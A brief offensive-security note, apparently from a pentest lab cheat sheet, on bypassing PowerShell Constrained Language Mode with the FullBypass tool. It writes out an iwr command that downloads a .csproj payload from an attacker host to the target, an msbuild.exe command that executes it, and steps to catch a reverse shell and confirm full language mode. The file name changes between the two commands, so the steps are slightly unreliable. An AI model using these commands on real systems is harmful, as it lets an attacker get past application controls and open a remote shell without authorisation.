To bypass CLM I used this tool here: https://github.com/Sh3lldon/FullBypass

> Download the bypass file to the target machine:

```
iwr -uri http://192.168.x.x/FullBypass.csproj -o FullBypass.csproj
```

> From the destination folder run the following:

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe .\bypass.csproj
```

Start your reverse shell listener and then supply the IP and port. Once you have a shell test for CLM to make sure you have full language:

```
$ExecutionContext.SessionState.LanguageMode
```
